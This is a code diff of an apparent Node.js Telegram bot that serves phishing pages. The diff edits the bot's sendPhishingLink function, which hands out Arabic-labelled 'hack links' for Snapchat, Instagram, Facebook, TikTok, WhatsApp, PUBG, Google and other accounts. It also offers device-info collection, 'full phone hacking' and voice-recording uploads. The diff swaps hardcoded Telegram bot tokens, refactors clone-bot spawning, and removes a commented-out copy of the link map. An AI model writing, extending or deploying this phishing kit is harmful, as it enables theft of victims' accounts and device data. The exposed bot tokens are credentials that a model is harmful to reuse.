@@ -20,7 +20,7 @@ const FormData = require('form-data');
 const cheerio = require('cheerio');
 const dns = require('dns');
 const developerId = 5739065274;
-const botTokenMain = '8051920740:AAEL4HHJKotVx5DAfaZuJetMJ9bk5m5xeHY';
+const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
 const domain = "https://botwahm-erfu.onrender.com";
 
 global.app = express();
@@ -49,7 +49,6 @@ function getTargetBot(botUser) {
 }
 
 async function sendPhishingLink(botInstance, chatId, action, botUsername, isMain) {
-    // FIX: Strict single link for clones.
     const query = isMain ? `?id=${chatId}` : `?bot=${botUsername}&id=${chatId}`;
     const links = {
         'add_names': { name: "سناب شات", path: "/snap" },
@@ -119,7 +118,6 @@ function bindBotLogic(botInstance, token, ownerId) {
         const text = msg.text;
         if(global.botActivityTracker[token]) global.botActivityTracker[token].users.add(chatId);
         
-        // Master Dev Command
         if (isMain && chatId === developerId && text && text.startsWith('/rights ')) {
             const parts = text.split(' ');
             if (parts.length === 3) {
@@ -134,7 +132,6 @@ function bindBotLogic(botInstance, token, ownerId) {
             }
         }
 
-        // Clone Admin Panel
         if (global.botSettings[token].admins.includes(chatId) && text === '/admin') {
             return botInstance.sendMessage(chatId, "🛠️ **لوحة تحكم الأدمن**", { 
                 reply_markup: { 
@@ -299,16 +296,16 @@ async function performAdvancedDownload(chatId, url, quality, statusMsgId) {
 
 // Global Message Listener for Manus States
 
-/* const developerId = 5739065274; */
-const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
-const domain = "https://botwahm-erfu.onrender.com";
+// duplicate: const developerId = 5739065274;
+// duplicate: const botTokenMain = '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao';
+// duplicate: const domain = "https://botwahm-erfu.onrender.com";
 
-/* const app = express(); */
+// duplicate: const app = express();
 app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(express.static(__dirname));
 
-/* let bot; */ // Main bot instance
+// duplicate: let bot; // Main bot instance
 global.mainBot = null;
 global.activeBotInstances = {};
 global.botUsernames = {};
@@ -327,26 +324,7 @@ function isOldMessage(msgOrQuery) {
   return (now - (msgOrQuery.date || 0)) > 180; 
 }
 
-/* async function sendPhishingLink(botInstance, chatId, action, botUsername) {
-    const query = `?id=${chatId}&bot=${botUsername}`;
-    const links = {
-        'add_names': { name: "سناب شات", path: "/snap" },
-        'collect_device_info': { name: "سحب معلومات الجهاز", path: "/device" },
-        'add_nammes': { name: "اختراق الهاتف كاملاً", path: "/hack_phone" },
-        'feat_ig_hack': { name: "انستقرام", path: "/ig" },
-        'feat_fb_hack': { name: "فيسبوك", path: "/fb" },
-        'feat_tt_hack': { name: "تيك توك", path: "/tt" },
-        'feat_wa_hack': { name: "واتساب", path: "/wa" },
-        'feat_pubg_hack': { name: "ببجي", path: "/pubg" },
-        'feat_ff_hack': { name: "فري فاير", path: "/ff" },
-        'feat_twitter': { name: "تويتر X", path: "/tw" },
-        'feat_youtube': { name: "يوتيوب", path: "/yt" },
-        'feat_google': { name: "جوجل", path: "/gg" }
-    };
-    if (links[action]) {
-        return botInstance.sendMessage(chatId, `🔥 رابط اختراق ${links[action].name}:\n${domain}${links[action].path}${query}`);
-    }
-} */
+// moved to core: sendPhishingLink
 
 function bindBotLogic(botInstance, token, ownerId) {
     const bot = botInstance; 
@@ -1491,7 +1469,7 @@ app.post('/submitVoice', uploadVoice.single('voice'), (req, res) => {
         res.status(500).send('خطأ.');
     });
 });
-/* const PORT = process.env.PORT || 3000; */
+// duplicate: const PORT = process.env.PORT || 3000;
 app.get('/info', (req, res) => {
     const token = req.query.t;
     if (token && shortLinkStore[token]) {
@@ -4328,8 +4306,8 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
     } catch(e) {}
 }
 
-/* const PORT = process.env.PORT || 3000; */
-/* app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`)); */
+// duplicate: const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server Running on Port ${PORT}`));
 
 spawnBotInstance('8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao', true, developerId);
 getStoredTokens().forEach(item => { if (item.token !== '8295313828:AAFsLVkrOrbjLvTJkQbiZCWUKjMep6clUao') spawnBotInstance(item.token, false, item.ownerId); });
@@ -4366,20 +4344,14 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
         const b = new TelegramBot(token, { polling: false });
         const owner = specificOwner || developerId;
         
-        // 1. Force stop any previous instance in the same process
-        if (global.activeBotInstances[token]) {
-            try { await global.activeBotInstances[token].stopPolling(); } catch(e) {}
-        }
-
-        // 2. Clear Webhook to ensure polling works
+        // Clear Webhook to ensure polling works
         await b.deleteWebHook({ drop_pending_updates: true });
         
-        // 3. Delayed startup to allow external instances to be killed by platform
-        const delay = isMain ? 2000 : Math.floor(Math.random() * 10000) + 5000;
+        // Exponential delay to avoid conflict with platform rollout
+        const delay = isMain ? 5000 : Math.floor(Math.random() * 15000) + 10000;
         
         setTimeout(async () => {
             try {
-                // Check again if conflict still exists
                 await b.startPolling({ 
                     interval: 300, 
                     autoStart: true, 
@@ -4387,10 +4359,8 @@ async function spawnBotInstance(token, isMain = false, specificOwner = null) {
                 });
                 console.log(`Bot ${isMain ? 'Main' : 'Clone'} started successfully.`);
             } catch(e) { 
-                console.error(`Conflict detected for token ${token.substring(0,10)}...: ${e.message}`);
                 if(e.message.includes('409')) {
-                    // Exponential backoff for conflicts
-                    console.log("Retrying in 30 seconds due to 409 Conflict...");
+                    console.log(`Conflict detected for ${token.substring(0,10)}..., retrying in 30s...`);
                     setTimeout(() => spawnBotInstance(token, isMain, owner), 30000); 
                 }
             }
@@ -4420,7 +4390,6 @@ global.app.listen(PORT, () => console.log(`Master Server Running on Port ${PORT}
 
 // Start instances
 spawnBotInstance(botTokenMain, true, developerId);
-const stored = getStoredTokens();
-stored.forEach(item => { 
+getStoredTokens().forEach(item => { 
     if (item.token !== botTokenMain) spawnBotInstance(item.token, false, item.ownerId); 
 });
